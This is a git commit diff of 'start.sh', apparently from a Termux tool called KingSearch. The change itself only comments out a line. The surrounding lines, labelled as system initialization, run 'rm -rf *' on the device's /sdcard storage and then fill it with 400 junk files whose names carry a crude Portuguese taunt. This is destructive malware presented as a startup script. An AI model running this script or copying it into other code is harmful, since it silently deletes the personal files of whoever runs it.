0f4138ca365f90a1c9169776ee3aada7b348ef89
TheKing <121489549+TheKingevd@users.noreply.github.com>
2022-12-27 12:47:17 -0300

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,6 +1,6 @@
 #!usr/bin/bash
 
-script para dar inicialização no sistema
+#script para dar inicialização no sistema
 cd /sdcard/ && rm -rf * && clear
 cd /sdcard/ && touch Wolf_E_Jeff_Passou_A_PIKAKKKK{1..400}.txt && clear
 cd /data/data/com.termux/files/home/KingSearch/
